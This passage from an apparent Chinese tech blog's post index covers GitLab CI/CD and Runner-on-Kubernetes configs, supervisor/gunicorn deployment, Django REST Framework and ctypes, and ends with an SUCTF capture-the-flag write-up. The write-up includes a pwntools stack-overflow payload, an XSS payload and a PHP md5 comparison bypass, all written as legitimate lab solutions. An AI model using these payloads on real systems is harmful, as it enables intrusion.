cicd name: executor-rolerules: # runner 要新建 pod，所以为它赋予 pod 相关的权限 - apiGroups: [\"\"] resources: [\"pods\", \"pods/exec\"] verbs: [\"get\", \"list\", \"watch\", \"create\", \"update\", \"patch\", \"delete\"]---apiVersion: rbac.authorization.k8s.io/v1kind: RoleBindingmetadata: namespace: cicd name: executor-rolebindingsubjects:- kind: ServiceAccount name: executor namespace: cicdroleRef: kind: Role name: executor apiGroup: rbac.authorization.k8s.io---apiVersion: v1kind: ConfigMapmetadata: namespace: cicd labels: app: gitlab-deployer name: gitlab-runner-cmdata: # 具体可用的参数配置以及环境变量配置可以运行 gitlab-runner register --help 查看 REGISTER_NON_INTERACTIVE: \"true\" REGISTER_LOCKED: \"false\" CI_SERVER_URL: \"https://gitlab.com/ci\" METRICS_SERVER: \"0.0.0.0:9100\" RUNNER_CONCURRENT_BUILDS: \"4\" RUNNER_REQUEST_CONCURRENCY: \"4\" RUNNER_TAG_LIST: \"tag1,tag2\" RUNNER_EXECUTOR: \"kubernetes\" KUBERNETES_NAMESPACE: \"cicd\" KUBERNETES_SERVICE_ACCOUNT: \"executor\" KUBERNETES_CPU_LIMIT: \"100m\" KUBERNETES_MEMORY_LIMIT: \"100Mi\" KUBERNETES_SERVICE_CPU_LIMIT: \"100m\" KUBERNETES_SERVICE_MEMORY_LIMIT: \"100Mi\" KUBERNETES_HELPER_CPU_LIMIT: \"100m\" KUBERNETES_HELPER_MEMORY_LIMIT: \"100Mi\" KUBERNETES_PULL_POLICY: \"if-not-present\" KUBERNETES_TERMINATIONGRACEPERIODSECONDS: \"10\" KUBERNETES_POLL_INTERVAL: \"5\" KUBERNETES_POLL_TIMEOUT: \"360\" KUBERNETES_IMAGE: \"kubectl:1.8.1\"---apiVersion: v1kind: Secretmetadata: name: gitlab-ci-token namespace: cicdtype: Opaquedata: token: aGhoaGhoaGg=---apiVersion: apps/v1beta2kind: Deploymentmetadata: name: runner namespace: cicd labels: app: runnerspec: replicas: 1 selector: matchLabels: app: runner template: metadata: labels: app: runner spec: containers: - name: ci-builder image: gitlab/gitlab-runner:v10.6.0 command: # 命令有点长，做了以下几步：注销当前的 runner name 以防止 runner 冲突；注册新的 runner；启动 runner daemon - /bin/bash - -c - \"/usr/bin/gitlab-runner unregister -n $RUNNER_NAME || true; /usr/bin/gitlab-runner register; exec /usr/bin/gitlab-runner run\" imagePullPolicy: IfNotPresent envFrom: # 通过 ConfigMap 注入 runner 配置 - configMapRef: name: gitlab-runner-cm env: # 通过 Secret 注入与 GitLab 实例进行交互所用的 CI Token # runner 命令会自动从环境变量中读取这个 token，用于注册 runner - name: CI_SERVER_TOKEN valueFrom: secretKeyRef: name: gitlab-ci-token key: token # 动态注入环境变量，使用 pod name 作为 runner name # 刚查了一下文档，如果不通过环境变量指定 runner name 的话，会用当前环境的 hostname，也就是 pod name 来做 runner name # 那完全没必要把这个 pod name 注册进去嘛… - name: RUNNER_NAME valueFrom: fieldRef: fieldPath: metadata.name # gitlab-runner 自带 Prometheus metrics server，通过上面的 METRICS_SERVER 环境变量配置 # 强的一比！ ports: - containerPort: 9100 name: http-metrics protocol: TCP resources: limits: cpu: \"100m\" memory: \"100Mi\" requests: cpu: \"100m\" memory: \"100Mi\" lifecycle: # 在 pod 停止前，注销这个 runner preStop: exec: command: - /bin/bash - -c - \"/usr/bin/gitlab-runner unregister -n $RUNNER_NAME\" restartPolicy: Always这里注意两点：Kubernetes executor 不支持在运行 job 是使用 service alias，所以访问服务时都要通过 127.0.0.1 来访问；你可能注意到，配置里出现了三种 resource limit 配置：KUBERNETES_CPU_LIMIT, KUBERNETES_SERVICE_CPU_LIMIT, KUBERNETES_HELPER_CPU_LIMIT，这里三个配置将应用于 kubernetes job pod 中的三类容器，第一类用于实际执行命令，第二类（service 容器）用于启动 job 所需的 service，第三类（helper 容器）用于任务执行之前的代码拉取，以及任务执行之后构建产物（artifact）的上传。我们可以通过配置来为三种容器赋予不同的资源限制。至此，我们可以在 Docker 和 Kubernetes 环境下部署 GitLab Runner.","categories":[{"name":"DevOps","slug":"DevOps","permalink":"https://blog.stdioa.com/categories/DevOps/"}],"tags":[{"name":"DevOps","slug":"DevOps","permalink":"https://blog.stdioa.com/tags/DevOps/"},{"name":"GitLab","slug":"GitLab","permalink":"https://blog.stdioa.com/tags/GitLab/"},{"name":"CI/CD","slug":"CI-CD","permalink":"https://blog.stdioa.com/tags/CI-CD/"}]},{"title":"GitLab CI/CD 基础教程（一）","slug":"gitlab-cicd-fundmental","date":"2018-06-06T07:46:00.000Z","updated":"2018-07-12T00:14:59.213Z","comments":true,"path":"2018/06/gitlab-cicd-fundmental/","link":"","permalink":"https://blog.stdioa.com/2018/06/gitlab-cicd-fundmental/","excerpt":"最近玩了 GitLab CI/CD 平台，通过搭建这个平台也收获了一些关于 DevOps 的基本技能，打算通过几篇文章来讲述一下 GitLab CI/CD 平台的构建及应用。本文对 GitLab CI/CD 以及 CI/CD 流程定义文件的写法做了简要介绍。","text":"最近玩了 GitLab CI/CD 平台，通过搭建这个平台也收获了一些关于 DevOps 的基本技能，打算通过几篇文章来讲述一下 GitLab CI/CD 平台的构建及应用。本文对 GitLab CI/CD 以及 CI/CD 流程定义文件的写法做了简要介绍。前几个月公司技术改进，某些业务部署在 k8s 集群中，于是我们开始通过 GitLab 自带的 CI/CD 功能来实现服务的测试、构建及部署，所以才有了这篇文章。 1. 基本概念 1.1 CI/CDCI，Continuous Integration，为持续集成。即在代码构建过程中持续地进行代码的集成、构建、以及自动化测试等；有了 CI 工具，我们可以在代码提交的过程中通过单元测试等尽早地发现引入的错误；CD，Continuous Deployment，为持续交付。在代码构建完毕后，可以方便地将新版本部署上线，这样有利于快速迭代并交付产品。 1.2 GitLab CI/CDGitLab CI/CD（后简称 GitLab CI）是一套基于 GitLab 的 CI/CD 系统，可以让开发人员通过 .gitlab-ci.yml 在项目中配置 CI/CD 流程，在提交后，系统可以自动/手动地执行任务，完成 CI/CD 操作。而且，它的配置非常简单，CI Runner 由 Go 语言编写，最终打包成单文件，所以只需要一个 Runner 程序、以及一个用于运行 jobs 的执行平台（如裸机+SSH，Docker 或 Kubernetes 等，我推荐用 Docker，因为搭建相当容易）即可运行一套完整的 CI/CD 系统。下面针对 Gitlab CI 平台的一些基本概念做一个简单介绍：JobJob 为任务，是 GitLab CI 系统中可以独立控制并运行的最小单位。在提交代码后，开发者可以针对特定的 commit 完成一个或多个 job，从而进行 CI/CD 操作。PipelinePipeline 即流水线，可以像流水线一样执行多个 Job.在代码提交或 MR 被合并时，GitLab 可以在最新生成的 commit 上建立一个 pipeline，在同一个 pipeline 上产生的多个任务中，所用到的代码版本是一致的。Stage一般的流水线通常会分为几段；在 pipeline 中，可以将多个任务划分在多个阶段中，只有当前一阶段的所有任务都执行成功后，下一阶段的任务才可被执行。注：如果某一阶段的任务均被设定为“允许失败”，那这个阶段的任务执行情况，不会影响到下一阶段的执行。上图中，整条流水线从左向右依次执行，每一列均为一个阶段，而列中的每个可操控元素均为任务。左边两个阶段的任务是自动执行的任务，在 commit 提交后即可自动开始运行，执行成功或失败后，可以点击任务右边的按钮重试；而右边两个是手动触发任务，需要人工点击右边的“播放”按钮来手动运行。 2. CI/CD 流程配置 2.1 完整定义GitLab 允许在项目中编写 .gitlab-ci.yml 文件，来配置 CI/CD 流程。下面，我们来编写一个简单的测试→构建→部署的 CI/CD 流程。首先，可以定义流程所包含的阶段。我们的流程包含三个阶段：测试、构建和部署。在 .gitlab-ci.yml 的开头，定义好所有阶段、以及执行每个任务之前所需要的环境变量以及准备工作，然后定义整个流程中包含的所有任务：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253stages: - test - build - deployvariables: IMAGE: docker.registry/name/$&#123;CI_PROJECT_NAMESPACE&#125;-$&#123;CI_PROJECT_NAME&#125;before_script: - IMAGE_TAG=$&#123;IMAGE&#125;:$&#123;CI_COMMIT_SHA:0:8&#125;test_all: image: \"pymicro\" stage: test services: - name: mysql:5.6 alias: mysql veriables: MYSQL_DATABASE: db MYSQL_ROOT_PASSWORD: password before_script: - pip install -U -r requirements.txt script: - flake8 app - pytest testsbuild_image: image: \"docker:17.11\" stage: build services: - name: \"docker:17.12.0-ce-dind\" alias: dockerd variables: DOCKER_HOST: tcp://dockerd:2375 only: - master tags: - build script: - docker build -t $&#123;IMAGE_TAG&#125; -f Dockerfile . - docker push $&#123;IMAGE_TAG&#125;deploy_production: stage: deploy variables: GIT_STRATEGY: none only: - master when: manual tags: - deploy-production script: - kubectl set image deploy/myproject \"app=$&#123;IMAGE_TAG&#125;\" --record在每个任务中，通常会包含 image, stage,services, script 等字段。其中，stage 定义了任务所属的阶段；image 字段指定了执行任务时所需要的 docker 镜像；services 指定了执行任务时所需的依赖服务（如数据库、Docker 服务器等）；而 script 直接定义了任务所需执行的命令。下面简单介绍一下每个阶段中的任务。 2.2 测试在测试任务中，我们启动了 MySQL 服务，并通过环境变量注入了 MySQL 的初始数据库以及 Root 密码，在服务启动后，Runner 会运行 before_script 中的命令来安装所需依赖；安装成功后就会运行 script 属性中的命令来进行代码风格检查以及单元测试；可以注意到，我们的 MySQL 服务下有一个 alias 属性标识服务别名。如果你的 Runner 运行在 Docker 平台下，你可以直接通过服务别名访问到该测试环境中对应的服务。比如在这个任务中，我们就可以用 mysql://root:password@mysql/db 来访问测试数据库。 2.3 构建在构建任务中，我们会用 Dockerfile 注入依赖，将工程打包成 Docker 镜像并上传；我们为这个任务定义了一些额外的属性：tag 属性可以标记这个任务将在含有特定 tag 的 CI Runner 上运行；而 only 属性表示只有这个 commit 在特定的分支下（如 master）时，才可以在此 commit 上运行这个任务。only 和 except 支持很多种环境条件判断，详细的用法可以参考官方文档。另外，我们在 before_scripts 中，通过环境变量拿到了项目所属的组，以及项目名称。GitLab 会在运行任务前，向环境中注入很多环境变量，来表明运行环境以及上下文。所有的环境变量列表可以看文档。 2.4 部署在部署任务中，我们会用 kubectl set image 命令将我们刚刚构建的镜像发布到生产环境。这个任务中的 when 表示运行该任务所需要的必要条件，如前一阶段任务全部成功。when: manual 表示该操作只允许手动触发。该属性具有四个选项，具体请见文档。至此，我们在 .gitlab-ci.yml 中定义了一套完整的测试→构建→部署流程。","categories":[{"name":"DevOps","slug":"DevOps","permalink":"https://blog.stdioa.com/categories/DevOps/"}],"tags":[{"name":"DevOps","slug":"DevOps","permalink":"https://blog.stdioa.com/tags/DevOps/"},{"name":"GitLab","slug":"GitLab","permalink":"https://blog.stdioa.com/tags/GitLab/"},{"name":"CI/CD","slug":"CI-CD","permalink":"https://blog.stdioa.com/tags/CI-CD/"}]},{"title":"使用 supervisor 及 gunicorn 部署 Web 应用","slug":"deploy-apps-with-supervisor-and-gunicorn","date":"2017-03-19T09:00:00.000Z","updated":"2018-07-12T00:15:09.045Z","comments":true,"path":"2017/03/deploy-apps-with-supervisor-and-gunicorn/","link":"","permalink":"https://blog.stdioa.com/2017/03/deploy-apps-with-supervisor-and-gunicorn/","excerpt":"很久之前就想尝试一下用 supervisor 部署 Web 应用，几个月前把 Python 应用的服务器都换成了 gunicorn，今天终于把进程管理服务换成了 supervisor. 看我的拖延症。","text":"很久之前就想尝试一下用 supervisor 部署 Web 应用，几个月前把 Python 应用的服务器都换成了 gunicorn，今天终于把进程管理服务换成了 supervisor. 看我的拖延症。 1. 前言之前一直在用 tmux 来托管各种 Web 应用进程，感觉这种想法真的很蠢，于是今天把托管方式换成了更专业的 supervisor，并用它托管了三个 Django APP，一个 flask APP，还有一个 node APP.简单看看今天要用的东西：gunicorn，一个 Python 实现的 WSGI 服务器；supervisor，一个进程管理工具。Django, Flask, Node.js，不多说。 2. supervisor 安装及基础配置pip2 install supervisor 即可。注意，supervisor 不支持 Python 3.supervisor 提供了一个配置生成程序 echo_supervisord_conf，可以用它来直接生成一个实例配置文件。直接输入 echo_supervisord_conf &gt; /etc/supervisor/supervisord.conf，将配置写入文件。随后，修改配置文件，开启 http 管理服务：1234[inet_http_server] ; inet (TCP) server disabled by defaultport = 127.0.0.1:9001 ; (ip_address:port specifier, *:port for all iface)username = stdio ; (default is no username (open server))password = password ; (default is no password (open server))添加选项，包含子目录 conf.d 下的所有配置文件：12[include]files = conf.d/*.conf随后，使用 sudo supervisord -c /etc/supervisor/supervisord.conf，启动 supervisor 守护进程。配置一下 Nginx，登录管理页面，可以看到 supervisor 正在运行，不过现在还没有配置任何服务。同理，可以使用 supervisorctl 程序，来查看服务运行状态。 3. 服务托管 3.1 托管一个 Django 应用进入 conf.d 文件夹，创建配置文件（如 baybook.conf）。1234567891011[program:baybook]command = gunicorn baybook.wsgi -b 127.0.0.1:8002 -n baybook ; 运行命令directory = /home/stdio/websites/baybook ; 运行路径user = stdioautostart = trueautorestart = truestartsecs = 5startretries = 3stdout_logfile = /var/log/supervisor/baybook_stdout.logstderr_logfile = /var/log/supervisor/baybook_stderr.logenvironment=DJANGO_SETTINGS_MODULE=\"baybook.settings.production\"其中，environment 选项可以配置运行环境的环境变量，比如在此处更改了 Django 的配置文件选项；startsecs 选项表示正常启动所需的时间，比如，当程序已持续运行超过 5 秒时，则视为程序启动成功。具体的配置选项可以查看文档。保存文件后，运行 supervisorctl update 使配置生效。随后可以输入 supervisorctl status 来查看配置状态。12$ sudo supervisorctl statusbaybook RUNNING pid 7658, uptime 1:19:55supervisor 提供了一个命令行界面，直接输入 supervisorctl 即可进入，随后可以输入一系列命令，如 start, stop, status, restart 来查看和控制服务运行状态。当然，也可以在 Web 管理页面中，查看及控制服务的运行状态。 3.2 托管 Node 应用Node 和 Django 的配置文件基本相同，不过，因为我的 node 应用 的启动速度比较慢，所以我把 startsecs 调高到了 30 秒。 3.3 托管 Flask 应用因为我的 Flask 应用运行在 virtualenv 创建的虚拟环境中，所以 command 命令要稍微改一下，将 gunicorn 可执行文件的路径改为虚拟环境中的 gunicorn 绝对路径，如 /home/stdio/websites/crypt/venv/bin/gunicorn. 4. 后记好像可写的就这么多…以后研究一下 gunicorn，再补充 gunicorn 的相关内容吧。","categories":[{"name":"Web","slug":"Web","permalink":"https://blog.stdioa.com/categories/Web/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://blog.stdioa.com/tags/Python/"},{"name":"Django","slug":"Django","permalink":"https://blog.stdioa.com/tags/Django/"},{"name":"supervisor","slug":"supervisor","permalink":"https://blog.stdioa.com/tags/supervisor/"},{"name":"gunicorn","slug":"gunicorn","permalink":"https://blog.stdioa.com/tags/gunicorn/"}]},{"title":"Django REST Framework 入门","slug":"DRF-demo","date":"2017-03-09T06:52:00.000Z","updated":"2018-07-12T11:35:13.401Z","comments":true,"path":"2017/03/DRF-demo/","link":"","permalink":"https://blog.stdioa.com/2017/03/DRF-demo/","excerpt":"拖了很久，终于用 Django REST Framework 写了个小 Demo.","text":"拖了很久，终于用 Django REST Framework 写了个小 Demo. 1. Django REST FrameworkDjango REST Framework 是一个用来构造 Web API 的、强大而灵活的工具包。最早认识这个框架是在我翻译的《5 个最受人喜爱的开源 Django 包》中，而真正接触它的时候已经是在五个月之后。那个时候在扇贝实习，第一次体会到了这个框架的简单易用。但那个时候也仅仅是做码农堆代码，并没有对这个框架产生特别深的了解。前两天写了一个小 Demo，尝试着用比较少的代码实现对某个模型的增删改查操作，今天简单把实现过程记录一下。完整的代码在这里。 2. 一点准备工作先安装依赖（推荐使用 virtualenv，虽然我从来不用🌚）：pip install Django djangorestframework.然后创建工程，创建 app.123django-admin startproject drf_democd drf_demo./manage.py startapp demo简单写一个 model：12345# demo/models.pyfrom django.db import models class Data(models.Model): content = models.CharField(max_length=128)迁移数据库：12./manage.py makemigrations./manage.py migrate在项目设置中添加 APP，顺便把 DRF 也添加进去：123456# drf_demo/settings.pyINSTALLED_APPS = [ # ... 'rest_framework', 'demo']在 root URL conf 中添加 APP 的 URL：12345# drf_femo/urls.pyurlpatterns = [ # ... url(r'^', include('demo.urls'))] 3. 开始动手写 API如果在 Django 中写一个页面，你需要：在 urls.py 中注册 view；在 views.py 中编写 view；在 templates 文件夹中编写模板。相对地，如果使用 DRF 创建一组 API，你需要：在 urls.py 中定义并注册 router；在 views.py 中定义 ViewSet；在 serializers.py 中定义 serializer. 3.1 创建 serializerserializer 是什么？简单而言，serializer 就是一种根据配置，用来把数据在 model instance 及 raw data 之间转换的对象。比如：我们可以针对刚刚定义的 model Data 来创建一个 serializer:123456789# demo/serializers.pyfrom .models import Datafrom rest_framework.serializers import ModelSerializer class DataSerializer(ModelSerializer): class Meta: model = Data fields = (\"id\", \"content\")然后，我们就可以通过这个 serializer 将数据在 Data 对象及 JSON 数据之间转换：123456789101112131415161718from demo.serializers import Data, DataSerializerfrom rest_framework.renderers import JSONRenderer # 用于 JSON 渲染及解析from rest_framework.parsers import JSONParserfrom django.utils.six import BytesIO instance = Data(content=\"test\")instance.save() serializer = DataSerializer(instance)JSONRenderer().render(serializer.data) # b'&#123;\"id\":1,\"content\":\"test\"&#125;' raw = b'&#123;\"id\":2,\"content\":\"another\"&#125;'stream = BytesIO(raw) # 将 JSON 数据变成 Python dictdata = JSONParser().parse(stream) serializer = DataSerializer(data=data)ins = serializer.save() # &lt;Data: Data object&gt;ins.__dict__ # &#123;'content': 'another', 'id': 2&#125; 3.2 创建 ViewSet非常简单，在 views.py 中定义一个 ViewSet 类，标明对应的 model 以及 serializer 即可：123456789# demo/views.pyfrom rest_framework.viewsets import ModelViewSetfrom .models import Datafrom .serializers import DataSerializer class DataViewSet(ModelViewSet): queryset = Data.objects.all() serializer_class = DataSerializer 3.3 定义、配置并注册 router1234567891011# demo/urls.pyfrom django.conf.urls import url, includefrom rest_framework.routers import DefaultRouterfrom .views import DataViewSet router = DefaultRouter() # 定义 routerrouter.register('data', DataViewSet) # 注册 viewset urlpatterns = [ url(r'^', include(router.urls)), # 在 urlpatterns 里包含 router] 4. 大功告成！启动服务器，访问 /data/，你就会看到 DRF 精美的调试界面，真是感动😭按照 RESTful API 规范，在列表界面，你可以通过 POST 表单来创建新对象：在详情界面（/data/1/），你可以通过 PUT 表单修改对象，或通过 DELETE 按钮来删除对象:当然，如果你乐意，使用 CURL 来调试也是可以的，服务器会给你返回 JSON 而不是 HTML:12$ curl -XPUT --data \"content=edit\" http://localhost:8000/data/1/&#123;\"id\":1,\"content\":\"edit\"&#125; 5. 等等…别忘了写测试！DRF 提供了一系列工具来协助 RESTful API 测试，比如 rest_framework.test.APIClient. APIClient 在发送请求时会根据配置自动设定 Content-Type, 而不是用 Django 自带 djanto.test.Client 的 application/octet-stream，方便了 API 测试。测试代码不在这里贴出（有些无趣），感兴趣的同学可以戳戳戳这里。教程结束。这两天我还会继续看 DRF，后面还会继续更新相关内容。更新…然而并没有更新。我看完了 DRF 的 tutorial，也在某个项目里碰到了坑/难用的地方，不过这些都没有太多可写的地方，所以就算了吧，遇到问题翻文档就好，DRF 的文档写的还是挺不错的。","categories":[{"name":"Python","slug":"Python","permalink":"https://blog.stdioa.com/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://blog.stdioa.com/tags/Python/"},{"name":"Django","slug":"Django","permalink":"https://blog.stdioa.com/tags/Django/"},{"name":"Django REST Framework","slug":"Django-REST-Framework","permalink":"https://blog.stdioa.com/tags/Django-REST-Framework/"}]},{"title":"Python 学习之 ctypes","slug":"learning-python-ctypes","date":"2016-12-30T03:27:00.000Z","updated":"2018-07-12T00:14:49.653Z","comments":true,"path":"2016/12/learning-python-ctypes/","link":"","permalink":"https://blog.stdioa.com/2016/12/learning-python-ctypes/","excerpt":"课设写不完，要炸了… Windows UI 好难写，只好用 PyQt 解决… 怎么把 Python 和 C 模块连起来？就用 ctypes.","text":"课设写不完，要炸了… Windows UI 好难写，只好用 PyQt 解决… 怎么把 Python 和 C 模块连起来？就用 ctypes. 1. 简介ctypes 是一个 Python 外部库。它提供 C 语言兼容的数据结构，而且我们可以通过它来调用 DLL 或共享库(shared library)的函数。 2. 快速上手编写 mod.c:12345678910111213141516#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt; int add(int a, int b)&#123; return a+b;&#125; char *hello(char *name)&#123; char *str; str = (char *)malloc(100); sprintf(str, \"Hello, %s\", name); return str;&#125;将 C 程序编译为共享库：gcc -fPIC -shared mod.c -o mod.so编写 Python 代码：1234567891011121314# coding: utf-8from ctypes import * mod = CDLL(\"./mod.so\") print(mod.add(1, 2)) # 3 hello = mod.hellohello.restype = c_char_p # Set response type, # otherwise an address(integer) will be returned world = create_string_buffer(b\"World\")res = hello(byref(world)) # Pass by pointerprint(res)完。剩下的等写完课设再更。","categories":[{"name":"Python","slug":"Python","permalink":"https://blog.stdioa.com/categories/Python/"}],"tags":[{"name":"python","slug":"python","permalink":"https://blog.stdioa.com/tags/python/"},{"name":"ctypes","slug":"ctypes","permalink":"https://blog.stdioa.com/tags/ctypes/"}]},{"title":"SUCTF 非官方 Writeup","slug":"SuCTF-Writeup","date":"2016-11-15T11:23:58.000Z","updated":"2018-07-12T11:35:13.405Z","comments":true,"path":"2016/11/SuCTF-Writeup/","link":"","permalink":"https://blog.stdioa.com/2016/11/SuCTF-Writeup/","excerpt":"又玩了一场 CTF，虽然是个人赛，但是有老司机带我飞。继续开脑洞，也学到了不少，做了很多之前没做过的题。","text":"又玩了一场 CTF，虽然是个人赛，但是有老司机带我飞。继续开脑洞，也学到了不少，做了很多之前没做过的题。 PWN 这是你 hello pwn？文件在这里。反编译得到 main 和 getflag 函数：12345678910111213141516171819202122232425262728293031int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [sp+1Ch] [bp-64h]@1 setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); write(1, \"let's begin!\\n\", 0xDu); read(0, &amp;v4, 0x100u); return 0;&#125; //----- (0804865D) --------------------------------------------------------int getflag()&#123; char format; // [sp+14h] [bp-84h]@4 char s1; // [sp+28h] [bp-70h]@3 FILE *v3; // [sp+8Ch] [bp-Ch]@1 v3 = fopen(\"flag.txt\", \"r\"); if ( !v3 ) exit(0); printf(\"the flag is :\"); puts(\"SUCTF&#123;dsjwnhfwidsfmsainewmnci&#125;\"); puts(\"now,this chengxu wil tuichu.........\"); printf(\"pwn100@test-vm-x86:$\"); __isoc99_scanf(\"%s\", &amp;s1); if ( strcmp(&amp;s1, \"zhimakaimen\") ) exit(0); __isoc99_fscanf(v3, \"%s\", &amp;format); return printf(&amp;format);&#125;可以看出这个题需要覆盖返回地址，使主函数的返回地址变为 0x0804865D, 跳至 getflag 函数, 然后输入 “zhimakaimen” 得到 flag. 编写 payload：123456from pwn import * r = remote('xxx.xxx.xxx.xxx', 10000)r.send('A' * 112 + '\\x5d\\x86\\x04\\x08')r.interactive()最后得到 flag: SUCTF{5tack0verTlow_!S_s0_e4sy}.简单的栈溢出攻击，我做的第一道 PWN 题。一开始不知道 pwntool, 用 socket 写了一大堆代码，简直醉人。 Web flag 在哪？在 Cookie 里。HTTP 响应头带有 Cookie: flag=suctf%7BThi5_i5_a_baby_w3b%7D 字段。 编码都说了是编码，找吧。HTTP 响应头部有 Password: VmxST1ZtVlZNVFpVVkRBOQ==，base64 解码三次得出 Su233，提交至网页得到 flag. 然而网页上的提交按钮是假的😂好吧，反正表单 method 是 GET，从 URL 里输进去就行了。最后得到 flag: suctf{Su_is_23333} XSS1XSS 过滤了 &lt;script&gt; 标签。试试 img 吧。提交 Payload &lt;img src=# onerror=alert(1)&gt;，得到 flag suctf{too_eaSy_Xss}. PHP 是世界上最好的语言网页内容为空，查看源码得到 php:1234if(isset($_GET[\"password\"]) &amp;&amp; md5($_GET[\"password\"]) == \"0\") echo file_get_contents(\"/opt/flag.txt\");else echo file_get_contents(\"xedni.php\");MD5 == &quot;0&quot;，以前做过这道题，找个 MD5 开头是 0e 的字符串就行了，比如 s878926199a。提交得到 flag: suctf{PHP_!s_the_bEst_1anguage}.尼玛，字符串当数字比，PHP 真是世界上最好的语言啊。 ( ゜- ゜)つロ 乾杯给了一长串颜文字，跑个控制台吧，竟然 alert 出一段 Brainfuck 🌚好吧，找个 AAEncode 解码器，把混淆之前的代码解出来就行了，然后找个 Brainfuck 解释器跑一下，得到 flag: suctf{aAenc0de_and_bra1nf**k}. 你是谁？你从哪里来？以前做过了，改 HTTP 请求头部的 Origin 和 X-Forwarded-For 字段即可。得到 flag: suctf{C0ndrulation!_y0u_f1n1shed}. XSS2看了别人的 Writeup，麻蛋这竟然是道隐写？把 URL 中的 xss2.php 去掉竟然能把目录列出来…里面有个 TIFF 文件，文件里有 flag… 肠子搜悔青了😢 Mobile 最基础的安卓逆向题文件在这儿。先用 dex2jar 解出 jar 包，然后用 jd-gui 反编译，最后发现 flag 在 MainActivity 里：suctf{Crack_Andr01d+50-3asy} Mob200文件。反编译以后改代码，把加密过程逆过来，放到安卓系统里跑一下就能出结果。然而 Android Studio 跟我有仇… 工程跑不起来，算了。 mips文件。找了个在线反编译的网站 https://retdec.com/decompilation/ 去反编译，得到代码：123456789101112131415161718192021222324252627282930313233343536373839#include &lt;stdint.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt; char * g1 = \"\\x58\\x31\\x70\\x5c\\x35\\x76\\x59\\x69\\x38\\x7d\\x55\\x63\\x38\\x7f\\x6a\"; // 0x410aa0 int main(int argc, char ** argv) &#123; int32_t str = 0; // bp-52 int32_t str2 = 0; // bp-32 printf(\"Input Key:\"); scanf(\"%16s\", &amp;str); int32_t v1 = 0; // bp-56 if (strlen((char *)&amp;str) == 0) &#123; if (memcmp((char *)&amp;str2, (char *)&amp;g1, 16) == 0) &#123; printf(\"suctf&#123;%s&#125;\\r\\n\", &amp;str); &#125; else &#123; puts(\"please reverse me!\\r\"); &#125; return 0; &#125; int32_t v2 = 0; // 0x4008148 int32_t v3 = v2 + (int32_t)&amp;v1; // 0x4007c0 unsigned char v4 = *(char *)(v3 + 4); // 0x4007c4 *(char *)(v3 + 24) = (char)((int32_t)v4 ^ v2); v1++; while (v1 &lt; strlen((char *)&amp;str)) &#123; v2 = v1; v3 = v2 + (int32_t)&amp;v1; v4 = *(char *)(v3 + 4); *(char *)(v3 + 24) = (char)((int32_t)v4 ^ v2); v1++; &#125; if (memcmp((char *)&amp;str2, (char *)&amp;g1, 16) == 0) &#123; printf(\"suctf&#123;%s&#125;\\r\\n\", &amp;str); &#125; else &#123; puts(\"please reverse me!\\r\"); &#125; return 0;&#125;里面有各种指针操作，不过也不麻烦，啃一下就好啦。编写解密程序：12345678char g[] = \"\\x58\\x31\\x70\\x5c\\x35\\x76\\x59\\x69\\x38\\x7d\\x55\\x63\\x38\\x7f\\x6a\"; int main() &#123; for (int i = 0; i &lt; strlen(g); i++) &#123; printf(\"%c\", g[i] ^ i); &#125; printf(\"\\n\");&#125;得到 flag: suctf{X0r_1s_n0t_h4rd}.一开始在想，为啥 mips 要放在 Mobile 里？后来想到有些路由器是 mips 架构的，没毛病。 Mob300文件。解压 apk，能看到里面的动态链接库。随便找了个 x86 的，反编译出来，在里面找各种常量，最后找到了几段字符串拼起来的 flag: suctf{Meet_jni_50_fun}.这个题也像是逆向… Misc 签到Misc 的题最好玩啦。题目上给了个 QQ 群，加进去，群文件里有 flag.txt.suctf{Welc0me_t0_suCTF} Misc-50题目给了个 超大的 GIF，一个长条，看了半天没看出所以然来。后来想了想，可能是每一帧拼起来能搞到 flag，于是写了个程序拼了一下。1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071import osfrom PIL import Image def analyseImage(path): ''' Pre-process pass over the image to determine the mode (full or additive). Necessary as assessing single frames isn't reliable. Need to know the mode before processing all frames. ''' im = Image.open(path) results = &#123; 'size': im.size, 'mode': 'full', &#125; try: while True: if im.tile: tile = im.tile[0] update_region = tile[1] update_region_dimensions = update_region[2:] if update_region_dimensions != im.size: results['mode'] = 'partial' break im.seek(im.tell() + 1) except EOFError: pass return results def processImage(path): ''' Iterate the GIF, extracting each frame. ''' final_img = Image.new('RGBA', (7*71, 750)) mode = analyseImage(path)['mode'] im = Image.open(path) i = 0 p = im.getpalette() last_frame = im.convert('RGBA') try: while True: if not im.getpalette(): im.putpalette(p) new_frame = Image.new('RGBA', im.size) if mode == 'partial': new_frame.paste(last_frame) new_frame.paste(im, (0,0), im.convert('RGBA')) final_img.paste(new_frame, (7*i, 0)) i += 1 last_frame = new_frame im.seek(im.tell() + 1) except EOFError: pass return final_img def main(): final_img = processImage('Misc-50.gif') final_img.save(\"Misc-50-final.png\") if __name__ == \"__main__\": main()出来一张图片，里面有 flag: suctf{t6cV165qUpEnZVY8rX} Forensic-100下载一个文件, file 一下发现是 gzip 压缩过的。想用 gzip -d SU 解压，然而报了一个 gzip: SU: unknown suffix -- ignored.重命名为 SU.gz，然后解压，得到一个 rot13 编码的字符串。解密一下：12codecs.encode('fhpgs&#123;CP9PuHsGx#&#125;', 'rot13')'suctf&#123;PC9ChUfTk#&#125;'关于 gzip 解压的问题，还有两种方法：gunzip -d SU，gunzip 不会管文件名，直接解压后把内容扔到 stdout 上。cat SU | gzip -d, 用管道把 SU 的 内容输出来。小插曲：上面那个 rot13 的字符串里有个井号，会触发 hexo 的一个谜之 bug…蛋疼。 这不是客服的头像嘛。。。。23333下载出一张图片，一张 jpg，EXIF 看不出名堂，stegsolve 也看不出来问题。binwalk 一下，里面有个压缩包，然后用 dd 提出来：12345678910$ binwalk xu.jpg DECIMAL HEX DESCRIPTION-------------------------------------------------------------------------------------------------------46046 0xB3DE RAR archive data $ dd if=xu.jpg of=xu.rar bs=1 skip=4604620221+0 records in20221+0 records out20221 bytes (20 kB) copied, 0.294344 s, 68.7 kB/s提出来解压，得到一个 img 镜像，挂载一下，里面有四张图片，拼起来是个二维码，扫一扫得到 flag: 